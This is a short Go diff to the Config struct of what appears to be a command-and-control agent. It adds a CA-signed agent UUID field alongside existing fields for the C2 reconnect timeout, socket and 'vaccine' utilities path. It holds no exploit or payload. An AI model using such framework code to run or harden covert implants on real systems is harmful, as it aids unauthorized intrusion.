@@ -67,7 +67,8 @@ type Config struct {
 	SocketName           string `json:"socket"`                 // agent socket, use this to check agent status
 	AgentRoot            string `json:"agent_root"`             // Where to store agent runtime files, default to /tmp
 	UtilsPath            string `json:"utils_path"`             // where to store `vaccine` files
-	AgentUUID            string `json:"agent_uuid"`             // UUID of agent
+	AgentUUID            string `json:"agent_uuid"`             // UUID of agent, used to verify agent
+	AgentUUIDSig         string `json:"agent_uuid_sig"`         // UUID of agent signed by CA
 	AgentTag             string `json:"agent_tag"`              // generated from UUID, will be used to identidy agents
 	Timeout              int    `json:"timeout"`                // wait until this amount of milliseconds to re-connect to C2
 }
